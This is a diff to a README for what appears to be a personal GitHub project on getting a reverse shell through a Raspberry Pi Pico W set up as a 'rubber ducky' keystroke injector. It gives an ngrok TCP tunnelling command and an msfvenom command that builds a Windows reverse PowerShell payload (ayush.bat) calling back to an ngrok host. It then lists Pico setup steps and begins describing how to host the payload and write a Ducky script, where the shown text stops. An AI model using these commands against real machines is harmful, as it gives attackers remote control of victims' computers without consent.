@@ -8,7 +8,7 @@ For port forwarding
 ```ngrok tcp 8080```<br><br>
 ![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)<br><br>
 ![ngrok1](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok1.png)<br><br>
-Windows reverse PowerShell payload<br>
+Create windows reverse PowerShell payload<br>
 ```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
 ![msf](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/msf.png)
 ## Rasberry pi pico w as rubber ducky
@@ -24,3 +24,5 @@ Windows reverse PowerShell payload<br>
 10. Copy `boot.py` from your clone to the root of your Pico.
 11. Copy `duckyinpython.py`, `code.py`, `webapp.py`, `wsgiserver.py` to the root folder of the Pico.
 ## Setting up an attacker server and a Ducky script
+Upload the Windows reverse PowerShell payload (ayush.bat) to your server; in my case, I have uploaded it to GitHub.<br><br>
+Create Ducky script
